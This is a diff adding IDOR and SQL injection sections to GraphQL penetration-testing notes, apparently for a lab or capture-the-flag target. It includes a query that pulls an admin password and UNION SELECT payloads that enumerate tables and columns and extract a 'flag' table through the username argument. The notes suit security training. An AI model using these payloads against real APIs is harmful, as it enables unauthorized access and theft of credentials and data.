@@ -159,3 +159,52 @@ query IntrospectionQuery {
 
 We can visualize the schema using tools such as [GraphQL-Voyager](https://github.com/APIs-guru/graphql-voyager).
 
+# Insecure Direct Object Reference (IDOR)
+
+A good start is to enumerate requests with Burp.
+
+A query like that in a POST request could reveal a password:
+```
+{"query":"{user(username: \"admin\") { username password }}"}
+```
+
+# Injection Attacks
+
+## SQL Injection
+We should investigate all GraphQL queries, check whether they support arguments, and analyze these arguments for potential SQL injections.
+We can send the query without any arguments and if the backend expects an argument, the response contains an error that tells us the name of the required argument.
+When a GraphQL query returns a structured object (like UserObject), UNION-based SQL injection can be used by aligning your payload with the structure of the object.
+Example:
+- Target GraphQL Field: user
+- Returned Object Type: UserObject (6 fields: uuid, id, username, password, role, msg - results of the introspection query)
+- Injection Vector: username parameter
+
+1. Discover Table Names
+```
+{
+  user(username: "' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
+    username
+  }
+}
+```
+- Match number of columns in UNION SELECT to fields in the return object.
+- Use GROUP_CONCAT() to aggregate results when only one row is returned.
+- Payload is injected inside a string argument to a GraphQL object query.
+- Terminate original query with ' and comment remainder with -- -.
+
+2. Discover Column Names in flag Table
+```
+{
+  user(username: "' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='flag'-- -") {
+    username
+  }
+}
+```
+3. Extract Flag from flag Table
+```
+{
+  user(username: "' UNION SELECT 1,2,flag,4,5,6 FROM flag-- -") {
+    username
+  }
+}
+```
